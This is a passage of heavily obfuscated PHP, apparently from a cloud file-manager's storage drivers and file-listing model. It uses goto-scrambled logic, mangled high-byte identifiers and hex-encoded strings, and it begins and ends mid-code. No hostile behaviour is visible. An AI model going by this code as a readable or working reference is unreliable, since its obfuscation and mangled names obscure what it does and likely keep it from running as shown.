{ continue; } $Eì”Ğã¼Œê = $EÚ¥¾ÃÃ£Ä . $DŠØ†ìÑÅù; if (is_dir($Eì”Ğã¼Œê)) { $D«æ–Í¥Ò[] = array($dëªôôóë[76] => $Eì”Ğã¼Œê . $dëªôôóë[8], $dëªôôóë[77] => 1, $dëªôôóë[78] => 0); $this->listAll($Eì”Ğã¼Œê, $D«æ–Í¥Ò); } else { $D«æ–Í¥Ò[] = array($dëªôôóë[76] => $Eì”Ğã¼Œê, $dëªôôóë[77] => 0, $dëªôôóë[78] => $this->size($Eì”Ğã¼Œê)); } } closedir($FÍîëàÎÕ); goto C˜¸Ã‚­ŞØ; fÜê Ê™Éæ: $dëªôôóë =& $_SERVER[‘®…¢À]; $EÚ¥¾ÃÃ£Ä = $this->iconvSystem($EÚ¥¾ÃÃ£Ä); $EÚ¥¾ÃÃ£Ä = rtrim($EÚ¥¾ÃÃ£Ä, $dëªôôóë[8]) . $dëªôôóë[8]; goto dÅ¯ã‡ßó…; C˜¸Ã‚­ŞØ: return $D«æ–Í¥Ò; goto cÒœ˜òŞĞ; cÒœ˜òŞĞ: } public function has($c¼å‚ÜÎĞõ, $B‰Û‘Ö•÷Ÿ = false, $e°Œ‚ŸÒ³ù = true) { goto E¦Óƒ¼èÊÇ; d±øŞùÅ: return !1; goto bÔßì˜¢¶±; C¼Äñ¦¥¬: if (!($EŸñ¬é¥õ = @opendir($c¼å‚ÜÎĞõ))) { return !1; } $ešçÌªëß® = 0; $Cèå°Àİô = 0; goto E™ÉÙÑ¢¬; E™ÉÙÑ¢¬: while (($eˆÙÏ ¯Äß = readdir($EŸñ¬é¥õ)) !== !1) { if ($eˆÙÏ ¯Äß == $f»Öã®Š¢‚[94] || $eˆÙÏ ¯Äß == $f»Öã®Š¢‚[1115]) { continue; } $D’ëßÉŠÅÖ = $c¼å‚ÜÎĞõ . $eˆÙÏ ¯Äß; if ($B‰Û‘Ö•÷Ÿ) { if (@is_file($D’ëßÉŠÅÖ)) { $ešçÌªëß®++; } else { $Cèå°Àİô++; } continue; } if ($e°Œ‚ŸÒ³ù) { if (@is_file($D’ëßÉŠÅÖ)) { return !0; } } else { if (@is_dir($D’ëßÉŠÅÖ . $f»Öã®Š¢‚[8])) { return !0; } } } closedir($EŸñ¬é¥õ); if ($B‰Û‘Ö•÷Ÿ) { return array($f»Öã®Š¢‚[188] => $ešçÌªëß®, $f»Öã®Š¢‚[189] => $Cèå°Àİô); } goto d±øŞùÅ; E¦Óƒ¼èÊÇ: $f»Öã®Š¢‚ =& $_SERVER[‘®…¢À]; $c¼å‚ÜÎĞõ = $this->iconvSystem($c¼å‚ÜÎĞõ); $c¼å‚ÜÎĞõ = rtrim($c¼å‚ÜÎĞõ, $f»Öã®Š¢‚[8]) . $f»Öã®Š¢‚[8]; goto C¼Äñ¦¥¬; bÔßì˜¢¶±: } public function hashSimple($Bô×¡‡¼„Ø) { goto A´˜â¯˜ñ‘; dòñŠö×åµ: $C†åŠƒìˆ = $this->size($Bô×¡‡¼„Ø); $bâ‹à×›òÆ = 200; $eî“ô¼ÒÃì = 50; goto D¦²ƒ¸âßÛ; f§´ø”ŸÉĞ: return md5($aÅŸÙ¦ò‰Û) . $C†åŠƒìˆ; goto bÅ×†•¡¶‚; A´˜â¯˜ñ‘: $dŠŠö÷êô› =& $_SERVER[‘®…¢À]; if (!$Bô×¡‡¼„Ø) { return md5($dŠŠö÷êô›[33]); } $Bô×¡‡¼„Ø = $this->iconvSystem($Bô×¡‡¼„Ø); goto dòñŠö×åµ; EÏä·òŒğÙ: fseek($cÙÍÆ·ÔŒì, $C†åŠƒìˆ - $bâ‹à×›òÆ); $aÅŸÙ¦ò‰Û .= fread($cÙÍÆ·ÔŒì, $bâ‹à×›òÆ); fclose($cÙÍÆ·ÔŒì); goto f§´ø”ŸÉĞ; a’µÛ¶“§: $cÙÍÆ·ÔŒì = fopen($Bô×¡‡¼„Ø, $dŠŠö÷êô›[1120]); if (!$cÙÍÆ·ÔŒì) { return $aÅŸÙ¦ò‰Û; } for ($b¥İëè“ÕĞ = 0; $b¥İëè“ÕĞ < $eî“ô¼ÒÃì; $b¥İëè“ÕĞ++) { fseek($cÙÍÆ·ÔŒì, $BÁ–ˆòµ™ * $b¥İëè“ÕĞ); $aÅŸÙ¦ò‰Û .= fread($cÙÍÆ·ÔŒì, $bâ‹à×›òÆ); } goto EÏä·òŒğÙ; D¦²ƒ¸âßÛ: if ($C†åŠƒìˆ <= $bâ‹à×›òÆ * $eî“ô¼ÒÃì) { return $this->hashMd5($Bô×¡‡¼„Ø) . $C†åŠƒìˆ; } $aÅŸÙ¦ò‰Û = $dŠŠö÷êô›[33]; $BÁ–ˆòµ™ = intval($C†åŠƒìˆ / $eî“ô¼ÒÃì); goto a’µÛ¶“§; bÅ×†•¡¶‚: } public function getContent($fÏù“¼„©ô) { $fÏù“¼„©ô = $this->iconvSystem($fÏù“¼„©ô); return file_get_contents($fÏù“¼„©ô); } public function setContent($B°İ‰Ùºù«, $FÈÎ™˜ğ”İ = '') { $B°İ‰Ùºù« = $this->iconvSystem($B°İ‰Ùºù«); @file_put_contents($B°İ‰Ùºù«, $FÈÎ™˜ğ”İ, LOCK_EX); clearstatcache(); return strlen($FÈÎ™˜ğ”İ) == filesize($B°İ‰Ùºù«); } public function fileSubstr($E—†„ìÒË, $eä·ÏÆÌÀÌ = 0, $EÙæÁéì’ù = false) { goto D­®™¥¥È„; F¾ëÈÇ´‰–: if ($EÙæÁéì’ù <= 0) { return $C—Æœ³¼¾Ö[33]; } $a÷ç²±¿Â‰ = fopen($E—†„ìÒË, $C—Æœ³¼¾Ö[1120]); if (!$a÷ç²±¿Â‰) { return !1; } goto F‚íŸÆÙ¤Ä; F‚íŸÆÙ¤Ä: fseek($a÷ç²±¿Â‰, $eä·ÏÆÌÀÌ); $aç˜ÅŸô·Ï = fread($a÷ç²±¿Â‰, $EÙæÁéì’ù); fclose($a÷ç²±¿Â‰); goto A¶î‘ÍåÃÚ; D­®™¥¥È„: $C—Æœ³¼¾Ö =& $_SERVER[‘®…¢À]; $E—†„ìÒË = $this->iconvSystem($E—†„ìÒË); if ($EÙæÁéì’ù === !1) { $EÙæÁéì’ù = $this->size($E—†„ìÒË); } goto F¾ëÈÇ´‰–; A¶î‘ÍåÃÚ: return $aç˜ÅŸô·Ï; goto B¸¢¨í„æŠ; B¸¢¨í„æŠ: } public function upload($dÑ²¼àÙíĞ, $aÉä®„ç™™, $e¾ŸÙî†Ã— = false, $cÕ¯ÓãêÀ = REPEAT_REPLACE) { $f»æĞ¼¹ó = $this->copyFile($aÉä®„ç™™, $dÑ²¼àÙíĞ); return $f»æĞ¼¹ó ? $this->getPathOuter($dÑ²¼àÙíĞ) : !1; } public function download($FƒçÓíĞñ, $a­¿“‹†µ£) { return $this->iconvSystem($FƒçÓíĞñ); } } class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($eÉŠ»º›Ã) { parent::__construct($eÉŠ»º›Ã); $this->signatureVersion($_SERVER[‘®…¢À][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($D¢Ì®à•šÄ, $A°íŒÎ¸Ú·, $BêÒóßÙø… = array()) { $aÂ‹ñÖÛ„â = $this->tempFile($D¢Ì®à•šÄ); $this->download($D¢Ì®à•šÄ, $aÂ‹ñÖÛ„â); $A«àĞğ°¸ = $this->upload($A°íŒÎ¸Ú·, $aÂ‹ñÖÛ„â); $this->tempFileRemve($aÂ‹ñÖÛ„â); return $A«àĞğ°¸; } public function uploadFormData($BŸŒç¾«†», $eÀ«ŠˆÛâ = 3600) { return parent::uploadFormData($BŸŒç¾«†», $eÀ«ŠˆÛâ); } public function fileOut($eÃ„‘Šö, $fƒÁÔ×ª“ = false, $d‹™–Ü…ä = false, $EªÆÅ«ºÀ… = '') { parent::fileOutServer($eÃ„‘Šö, $fƒÁÔ×ª“, $d‹™–Ü…ä, $EªÆÅ«ºÀ…); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÉ£ÈŒˆ÷á) { parent::__construct($DÉ£ÈŒˆ÷á); $this->signatureVersion($_SERVER[‘®…¢À][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto cƒ¿ì‹·›; BãÅÆ‹Å¸†: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\x63\145"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\x65" => "\151\x6f\x5f\163\x6f\x75\x72\x63\x65\137\155\x65\164\141", "\155\145\x74\x61\106\151\145\x6c\x64" => "\x73\x6f\165\162\x63\145\111\104"); protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\151\155\x65", "\164\x69\x6d\x65", "\151\156\163\x65\x72\164", "\146\165\x6e\x63\x74\x69\157\x6e"), array("\143\x72\x65\141\164\x65\124\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\145\x72\x74", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\166\x69\145\167\124\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\146\x75\156\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($B‰››·’²·) { return $this->listSource(array($_SERVER[‘®…¢À][364] => $B‰››·’²·)); } public function typeName($E¸ÆÍéèË) { static $F³Ë¡é«½ñ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $F³Ë¡é«½ñ[$E¸ÆÍéèË . $_SERVER[‘®…¢À][33]]; } public function sourceListInfo($e¯œ¿‹ö¶ê, $b˜‹º’¸•ç = false) { $fÖ¦÷ØÆ¦ =& $_SERVER[‘®…¢À]; $e¯œ¿‹ö¶ê = array_filter(array_unique($e¯œ¿‹ö¶ê)); if (!$e¯œ¿‹ö¶ê) { return array(); } $A…¼ã›ÂÆ = $this->where(array($fÖ¦÷ØÆ¦[365] => array($fÖ¦÷ØÆ¦[7], $e¯œ¿‹ö¶ê)))->select(); $this->_listDataApply($A…¼ã›ÂÆ, $b˜‹º’¸•ç); return array_to_keyvalue($A…¼ã›ÂÆ, $fÖ¦÷ØÆ¦[365]); } public function pathInfoFilter($A£ ™ÂÇª) { goto A›ÆÑã¹Š…; aØ¥ä»±¤ù: if (isset($A£ ™ÂÇª[$eÄì„ƒ×‚[372]]) && $A£ ™ÂÇª[$eÄì„ƒ×‚[372]][$eÄì„ƒ×‚[373]] == -1) { $EËåÚøºÈŒ = array_remove_value($EËåÚøºÈŒ, $eÄì„ƒ×‚[184]); $EËåÚøºÈŒ = array_remove_value($EËåÚøºÈŒ, $eÄì„ƒ×‚[108]); $EËåÚøºÈŒ = array_remove_value($EËåÚøºÈŒ, $eÄì„ƒ×‚[374]); $EËåÚøºÈŒ = array_remove_value($EËåÚøºÈŒ, $eÄì„ƒ×‚[375]); $EËåÚøºÈŒ = array_remove_value($EËåÚøºÈŒ, $eÄì„ƒ×‚[78]); $EËåÚøºÈŒ = array_remove_value($EËåÚøºÈŒ, $eÄì„ƒ×‚[376]); } $A£ ™ÂÇª = array_field_key($A£ ™ÂÇª, $EËåÚøºÈŒ); return $A£ ™ÂÇª; goto Aà±Ô‚Ä¸; EÄÖ˜¼Ïî: $A£ ™ÂÇª[$eÄì„ƒ×‚[367]] = $this->typeName($A£ ™ÂÇª[$eÄì„ƒ×‚[367]]); if ($A£ ™ÂÇª[$eÄì„ƒ×‚[366]] != 1) { $A£ ™ÂÇª[$eÄì„ƒ×‚[157]] = $A£ ™ÂÇª[$eÄì„ƒ×‚[368]]; unset($A£ ™ÂÇª[$eÄì„ƒ×‚[368]]); } $BÇ•‚¢ÄŸ‹ = $eÄì„ƒ×‚[369]; goto f”î„‹…“; f”î„‹…“: $BÇ•‚¢ÄŸ‹ .= $eÄì„ƒ×‚[370]; $BÇ•‚¢ÄŸ‹ .= $eÄì„ƒ×‚[371]; $EËåÚøºÈŒ = explode($eÄì„ƒ×‚[47], $BÇ•‚¢ÄŸ‹); goto aØ¥ä»±¤ù; A›ÆÑã¹Š…: $eÄì„ƒ×‚ =& $_SERVER[‘®…¢À]; $A£ ™ÂÇª[$eÄì„ƒ×‚[76]] = KodIO::make($A£ ™ÂÇª[$eÄì„ƒ×‚[365]]); $A£ ™ÂÇª[$eÄì„ƒ×‚[29]] = $A£ ™ÂÇª[$eÄì„ƒ×‚[366]] == 1 ? $eÄì„ƒ×‚[77] : $eÄì„ƒ×‚[164]; goto EÄÖ˜¼Ïî; Aà±Ô‚Ä¸: } public function listUserFav() { goto aöËĞ¿â; Aî¾¾³‡©ß: foreach ($aÖŒÌ¡‚¥¡ as &$bŞ†¤Ù‰İî) { $bŞ†¤Ù‰İî = array($a£ÑÅ®Š‡½[381] => $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[363]], $a£ÑÅ®Š‡½[382] => $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[28]], $a£ÑÅ®Š‡½[383] => $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[76]], $a£ÑÅ®Š‡½[384] => $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[29]], $a£ÑÅ®Š‡½[385] => $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[184]], $a£ÑÅ®Š‡½[386] => $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[108]]); if ($bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[29]] == $a£ÑÅ®Š‡½[378] && $C‘î¨Ô¤ñ‘[$bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[76]]]) { $bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[387]] = $C‘î¨Ô¤ñ‘[$bŞ†¤Ù‰İî[$a£ÑÅ®Š‡½[76]]]; } } return $aÖŒÌ¡‚¥¡; goto fºÉ¸±Â˜; aöËĞ¿â: $a£ÑÅ®Š‡½ =& $_SERVER[‘®…¢À]; $aÖŒÌ¡‚¥¡ = Model($a£ÑÅ®Š‡½[377])->listData(); $e‡°ßİ†ËÆ = array_filter_by_field($aÖŒÌ¡‚¥¡, $a£ÑÅ®Š‡½[29], $a£ÑÅ®Š‡½[378]); goto DèÁ·ì¯Ú„; DèÁ·ì¯Ú„: $e‡°ßİ†ËÆ = array_to_keyvalue($e‡°ßİ†ËÆ, $a£ÑÅ®Š‡½[33], $a£ÑÅ®Š‡½[76]); if ($e‡°ßİ†ËÆ) { $C‘î¨Ô¤ñ‘ = $this->listSource(array($a£ÑÅ®Š‡½[379] => array($a£ÑÅ®Š‡½[380], $e‡°ßİ†ËÆ))); } $C‘î¨Ô¤ñ‘ = array_to_keyvalue($C‘î¨Ô¤ñ‘[$a£ÑÅ®Š‡½[350]], $a£ÑÅ®Š‡½[365]); goto Aî¾¾³‡©ß; fºÉ¸±Â˜: } public function listUserTag($e„¥¡Ï†³) { goto A«ÑéÈİƒ‚; AÖåƒİŞïÎ: return $this->listSource($c°½Í’Š¾); goto a¤ªÆÒŸ¨Ë; A«ÑéÈİƒ‚: $Dé÷µ’–µŸ =& $_SERVER[‘®…¢À]; $D§ÉÔŠºÅŒ = Model($Dé÷µ’–µŸ[388])->listData(); $EããÀ§‰Á = array_filter_by_field($D§ÉÔŠºÅŒ, $Dé÷µ’–µŸ[389], $e„¥¡Ï†³); goto B»¶Øâí–Í; B»¶Øâí–Í: $EããÀ§‰Á = array_to_keyvalue($EããÀ§‰Á, $Dé÷µ’–µŸ[33], $Dé÷µ’–µŸ[76]); if (!$EããÀ§‰Á) { return array(); } $c°½Í’Š¾ = array($Dé÷µ’–µŸ[379] => array($Dé÷µ’–µŸ[380], $EããÀ§‰Á)); goto AÖåƒİŞïÎ; a¤ªÆÒŸ¨Ë: } public function listUserRecycle() { $Aºˆã—¬Ëª =& $_SERVER[‘®…¢À]; $aµ…²ÌÕ = Model($Aºˆã—¬Ëª[390])->listData(); if (!$aµ…²ÌÕ) { return array(); } $cèÛššöÜá = array($Aºˆã—¬Ëª[379] => array($Aºˆã—¬Ëª[380], $aµ…²ÌÕ), $Aºˆã—¬Ëª[391] => 1); return $this->listSource($cèÛššöÜá); } public function listSource($C¾ÌéĞºËÑ, $F¸»­‘‹Éé = 3000) { goto B—§”Ò˜‡; CŠŒÍ˜ÚÇ: $aœ©Ú©®çŞ = $this->field($FôÙ»Í‚…Ì)->_makeOrder()->where($C¾ÌéĞºËÑ)->selectPage($F¸»­‘‹Éé); $this->_listDataApply($aœ©Ú©®çŞ[$D•¾Ñ†±¼[350]]); $this->_listMake($aœ©Ú©®çŞ); goto CìÏº‰¯˜‰; CìÏº‰¯˜‰: return $aœ©Ú©®çŞ; goto döË°Æ¾Ó; B—§”Ò˜‡: $D•¾Ñ†±¼ =& $_SERVER[‘®…¢À]; if (!isset($C¾ÌéĞºËÑ[$D•¾Ñ†±¼[392]])) { $C¾ÌéĞºËÑ[$D•¾Ñ†±¼[392]] = 0; } $FôÙ»Í‚…Ì = $D•¾Ñ†±¼[393]; goto CŠŒÍ˜ÚÇ; döË°Æ¾Ó: } protected function _makeOrder() { goto EÑº°¦‚Ûë; CÑö³Ö™ùˆ: if ($bŠÁ©Š›÷Õ == $C«‡®×‹Òâ[28]) { } $Dœ¥šô½š = $C«‡®×‹Òâ[404] . $aÌ«£ˆÕš¢[$bŠÁ©Š›÷Õ] . $C«‡®×‹Òâ[50] . $c†áöƒ±·[$fï†‚óØÌ·]; return $this->order(rtrim(trim($Dœ¥šô½š), $C«‡®×‹Òâ[47])); goto Bë†Ï×éÕ±; EÑº°¦‚Ûë: $C«‡®×‹Òâ =& $_SERVER[‘®…¢À]; $C±ÂÄ‚ÑâÉ = Model($C«‡®×‹Òâ[394])->get($C«‡®×‹Òâ[395]); $f‘´Õ­šèå = Model($C«‡®×‹Òâ[394])->get($C«‡®×‹Òâ[396]); goto e«ñ‰”Öè¸; bÊ©²¨ä: $fï†‚óØÌ· = Input::get($C«‡®×‹Òâ[403], $C«‡®×‹Òâ[7], $f‘´Õ­šèå, array_keys($c†áöƒ±·)); if (!in_array($bŠÁ©Š›÷Õ, array_keys($aÌ«£ˆÕš¢))) { $bŠÁ©Š›÷Õ = $C«‡®×‹Òâ[28]; } if (!in_array($fï†‚óØÌ·, array_keys($c†áöƒ±·))) { $bŠÁ©Š›÷Õ = $C«‡®×‹Òâ[397]; } goto CÑö³Ö™ùˆ; e«ñ‰”Öè¸: $c†áöƒ±· = array($C«‡®×‹Òâ[397] => $C«‡®×‹Òâ[398], $C«‡®×‹Òâ[399] => $C«‡®×‹Òâ[400]); $aÌ«£ˆÕš¢ = array($C«‡®×‹Òâ[28] => $C«‡®×‹Òâ[28], $C«‡®×‹Òâ[78] => $C«‡®×‹Òâ[78], $C«‡®×‹Òâ[157] => $C«‡®×‹Òâ[368], $C«‡®×‹Òâ[374] => $C«‡®×‹Òâ[374], $C«‡®×‹Òâ[401] => $C«‡®×‹Òâ[375], $C«‡®×‹Òâ[184] => $C«‡®×‹Òâ[184], $C«‡®×‹Òâ[108] => $C«‡®×‹Òâ[108]); $bŠÁ©Š›÷Õ = Input::get($C«‡®×‹Òâ[402], $C«‡®×‹Òâ[7], $C±ÂÄ‚ÑâÉ, array_keys($aÌ«£ˆÕš¢)); goto bÊ©²¨ä; Bë†Ï×éÕ±: } protected function _listDataApplyItem($eâ¹ˆï¯ëŒ, $BäÊñÄô”ç = false) { $dÔ¥»ŒÊË = array($eâ¹ˆï¯ëŒ); $this->_listDataApply($dÔ¥»ŒÊË, $BäÊñÄô”ç); return $dÔ¥»ŒÊË[0]; } protected function _listDataApply(&$D…’Øˆõ¶, $dª§¤×êÙ = false) { goto a÷‘ªÃ®–·; B±ŞÆñ²í: $this->_listAppendUser($D…’Øˆõ¶); $this->_listFilterInfo($D…’Øˆõ¶, $dª§¤×êÙ); goto CĞ±ÊÕö©ò; a¤±ºñ»–Õ: $this->_listAppendPath($D…’Øˆõ¶); $this->_listAppendAuth($D…’Øˆõ¶); $this->_listAppendSourceInfo($D…’Øˆõ¶, $Fªå¸Ò™ø); goto B±ŞÆñ²í; a÷‘ªÃ®–·: $c¾ø†–ìƒ =& $_SERVER[‘®…¢À]; if (!$D…’Øˆõ¶) { $D…’Øˆõ¶ = array(); return; } $Fªå¸Ò™ø = array_to_keyvalue($D…’Øˆõ¶, $c¾ø†–ìƒ[33], $c¾ø†–ìƒ[365]); goto A±ğ×èÙ±Í; A±ğ×èÙ±Í: $Fªå¸Ò™ø = array_unique($Fªå¸Ò™ø); $this->_listSourceCache($D…’Øˆõ¶); if (!$dª§¤×êÙ) { $this->_listAppendMeta($D…’Øˆõ¶, $Fªå¸Ò™ø); $this->_listAppendFileMeta($D…’Øˆõ¶, $Fªå¸Ò™ø); $this->_listAppendChildren($D…’Øˆõ¶, $Fªå¸Ò™ø); } goto a¤±ºñ»–Õ; CĞ±ÊÕö©ò: } protected function _listSourceCache($cøøÂÇÜø) { $C±å¨¨Ê¢ò =& $_SERVER[‘®…¢À]; foreach ($cøøÂÇÜø as $C½öÃØ—ÍÃ) { self::$cacheSourceInfo[$C±å¨¨Ê¢ò[405] . $C½öÃØ—ÍÃ[$C±å¨¨Ê¢ò[365]]] = $C½öÃØ—ÍÃ; } } protected function _listFilterInfo(&$cŞí©¿ò­Ë, $cõÂ‘Ë† = false) { $Báƒ¬ª˜ =& $_SERVER[‘®…¢À]; foreach ($cŞí©¿ò­Ë as &$f˜í¬ÆÔ®ò) { $f˜í¬ÆÔ®ò = $this->pathInfoFilter($f˜í¬ÆÔ®ò); self::$cachePathInfo[$Báƒ¬ª˜[406] . intval($cõÂ‘Ë†) . $Báƒ¬ª˜[407] . $f˜í¬ÆÔ®ò[$Báƒ¬ª˜[365]]] = $f˜í¬ÆÔ®ò; } } protected function _listMake(&$C¨À”‚øîö) { $CØÛ÷âšÈä =& $_SERVER[‘®…¢À]; $C¨À”‚øîö[$CØÛ÷âšÈä[75]] = array(); $C¨À”‚øîö[$CØÛ÷âšÈä[74]] = array(); foreach ($C¨À”‚øîö[$CØÛ÷âšÈä[350]] as $a»ˆÎÇ‰Ö) { $f¬Ğó†Ò‚ = $a»ˆÎÇ‰Ö[$CØÛ÷âšÈä[366]] == 1 ? $CØÛ÷âšÈä[75] : $CØÛ÷âšÈä[74]; $C¨À”‚øîö[$f¬Ğó†Ò‚][] = $a»ˆÎÇ‰Ö; } unset($C¨À”‚øîö[$CØÛ÷âšÈä[350]]); } protected function _listAppendMeta(&$b±–ÌÊ®Çë, $Aˆ™‹¼ŸªÍ) { goto Aî‚ó‰à; Aî‚ó‰à: $B‹Õƒ»òÛò =& $_SERVER[‘®…¢À]; $C­•²ó¿Ö² = array($B‹Õƒ»òÛò[379] => array($B‹Õƒ»òÛò[380], $Aˆ™‹¼ŸªÍ)); $e‡Ñ­¬‚Åè = Model($B‹Õƒ»òÛò[408])->field($B‹Õƒ»òÛò[409])->where($C­•²ó¿Ö²)->select(); goto e†´ÙÆ’; e†´ÙÆ’: if (!$e‡Ñ­¬‚Åè) { return; } $D³çÁ¼‰Õã = array($B‹Õƒ»òÛò[410], $B‹Õƒ»òÛò[411]); $aÑÉÅø½® = array(); goto Fñ‡©ïæñ‡; Fñ‡©ïæñ‡: foreach ($e‡Ñ­¬‚Åè as $A ‘øáÔù¢) { if (!isset($aÑÉÅø½®[$A ‘øáÔù¢[$B‹Õƒ»òÛò[365]]])) { $aÑÉÅø½®[$A ‘øáÔù¢[$B‹Õƒ»òÛò[365]]] = array(); } if (in_array($A ‘øáÔù¢[$B‹Õƒ»òÛò[90]], $D³çÁ¼‰Õã)) { continue; } $aÑÉÅø½®[$A ‘øáÔù¢[$B‹Õƒ»òÛò[365]]][$A ‘øáÔù¢[$B‹Õƒ»òÛò[90]]] = $A ‘øáÔù¢[$B‹Õƒ»òÛò[355]]; } foreach ($b±–ÌÊ®Çë as &$d‘¿­Öå§ö) { $d‘¿­Öå§ö[$B‹Õƒ»òÛò[412]] = !1; if (isset($aÑÉÅø½®[$d‘¿­Öå§ö[$B‹Õƒ»òÛò[365]]])) { $d‘¿­Öå§ö[$B‹Õƒ»òÛò[412]] = $aÑÉÅø½®[$d‘¿­Öå§ö[$B‹Õƒ»òÛò[365]]]; } if ($this->fileIsLock($d‘¿­Öå§ö) && $d‘¿­Öå§ö[$B‹Õƒ»òÛò[372]]) { $c‘ß¯Üé»« = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $d‘¿­Öå§ö[$B‹Õƒ»òÛò[372]][$B‹Õƒ»òÛò[373]] = AuthModel::authDisable($d‘¿­Öå§ö[$B‹Õƒ»òÛò[372]][$B‹Õƒ»òÛò[373]], $c‘ß¯Üé»«); $d‘¿­Öå§ö[$B‹Õƒ»òÛò[372]][$B‹Õƒ»òÛò[413]][$B‹Õƒ»òÛò[372]] = $d‘¿­Öå§ö[$B‹Õƒ»òÛò[372]][$B‹Õƒ»òÛò[373]]; } } goto D›÷ÉäƒÔ; D›÷ÉäƒÔ: } protected function _listAppendFileMeta(&$fô¸Ã’Ÿ—, $Fğ¾¹ì–¼Ÿ) { goto fÅ—Ñ¦«œâ; f‡ƒ»×»­Õ: foreach ($fô¸Ã’Ÿ— as &$D¥Ú´Ç®¹¸) { goto FàÁáÌØÃ; FàÁáÌØÃ: $dÈõÒ³šéÅ = $D¥Ú´Ç®¹¸[$aîêŞô¡ó§[414]]; if (!$dÈõÒ³šéÅ || !isset($AßÁš‡Äß„[$dÈõÒ³šéÅ])) { continue; } $B ­ŠÍÃİÜ = $AßÁš‡Äß„[$dÈõÒ³šéÅ]; goto fÄ®†ê©Ó; C¸Úõ‡ºˆÄ: unset($AßÁš‡Äß„[$dÈõÒ³šéÅ][$aîêŞô¡ó§[76]]); $cµÛ÷¾§í = is_array($E‚¥¿áŞÖ¬[$dÈõÒ³šéÅ]) ? $E‚¥¿áŞÖ¬[$dÈõÒ³šéÅ] : array(); $D¥Ú´Ç®¹¸[$aîêŞô¡ó§[159]] = array_merge($cµÛ÷¾§í, $AßÁš‡Äß„[$dÈõÒ³šéÅ]); goto fç”ˆè…¹×; fç”ˆè…¹×: if (isset($D¥Ú´Ç®¹¸[$aîêŞô¡ó§[159]][$aîêŞô¡ó§[421]])) { $D¥Ú´Ç®¹¸[$aîêŞô¡ó§[421]] = json_decode($D¥Ú´Ç®¹¸[$aîêŞô¡ó§[159]][$aîêŞô¡ó§[421]], !0); unset($D¥Ú´Ç®¹¸[$aîêŞô¡ó§[159]][$aîêŞô¡ó§[421]]); } goto dŠˆ·¥š¶å; fÄ®†ê©Ó: $B ­ŠÍÃİÜ[$aîêŞô¡ó§[78]] = $D¥Ú´Ç®¹¸[$aîêŞô¡ó§[78]]; $B ­ŠÍÃİÜ[$aîêŞô¡ó§[28]] = $D¥Ú´Ç®¹¸[$aîêŞô¡ó§[28]]; self::$cacheFileInfo[$aîêŞô¡ó§[420] . $dÈõÒ³šéÅ] = $B ­ŠÍÃİÜ; goto C¸Úõ‡ºˆÄ; dŠˆ·¥š¶å: } goto e¸¥¼ÜÙÕ ; fÅ—Ñ¦«œâ: $aîêŞô¡ó§ =& $_SERVER[‘®…¢À]; $AÇÒ…•‡Á = array_to_keyvalue($fô¸Ã’Ÿ—, $aîêŞô¡ó§[33], $aîêŞô¡ó§[414]); $AÇÒ…•‡Á = array_filter(array_unique($AÇÒ…•‡Á)); goto eÜÄ’ŒƒÙ“; EõèÛæÕí¦: $E–°éé× = $E–°éé× ? $E–°éé× : array(); $E‚¥¿áŞÖ¬ = array(); foreach ($E–°éé× as $D®ŠÔÎ´ø) { if (!isset($E‚¥¿áŞÖ¬[$D®ŠÔÎ´ø[$aîêŞô¡ó§[414]]])) { $E‚¥¿áŞÖ¬[$D®ŠÔÎ´ø[$aîêŞô¡ó§[414]]] = array(); } $E‚¥¿áŞÖ¬[$D®ŠÔÎ´ø[$aîêŞô¡ó§[414]]][$D®ŠÔÎ´ø[$aîêŞô¡ó§[90]]] = $D®ŠÔÎ´ø[$aîêŞô¡ó§[355]]; } goto f‡ƒ»×»­Õ; eÜÄ’ŒƒÙ“: if (!$AÇÒ…•‡Á) { return; } $C´³š£ÍŠ‚ = array($aîêŞô¡ó§[415] => array($aîêŞô¡ó§[380], $AÇÒ…•‡Á)); $BŞÂŞÅ· = $aîêŞô¡ó§[416]; goto dîèòÀ; dîèòÀ: $AßÁš‡Äß„ = Model($aîêŞô¡ó§[417])->field($BŞÂŞÅ·)->where($C´³š£ÍŠ‚)->select(); $AßÁš‡Äß„ = array_to_keyvalue($AßÁš‡Äß„, $aîêŞô¡ó§[414]); $E–°éé× = Model($aîêŞô¡ó§[418])->field($aîêŞô¡ó§[419])->where($C´³š£ÍŠ‚)->select(); goto EõèÛæÕí¦; e¸¥¼ÜÙÕ : } protected function _listAppendSourceInfo(&$E„¦·õŒâã, $C£¬±­ÅÊ) { goto F³È‰¦•Ÿ¬; eõŠ‘ÖÚŒå: $CÚ†Ğ­Åò½ = array_to_keyvalue($Bê˜»±©àŸ, $AÈá¡Ì”â[363]); $Fƒİå¿ùÏŒ = array_to_keyvalue_group($FÌµĞÃ–·š, $AÈá¡Ì”â[76], $AÈá¡Ì”â[389]); $FÎçÒÕÛøÇ = array_to_keyvalue($F¬”¶ß°‚, $AÈá¡Ì”â[76]); goto bˆâŒØˆÀ; E÷Ââš™³¤: $FÌµĞÃ–·š = Model($AÈá¡Ì”â[388])->listData(); $F¬”¶ß°‚ = 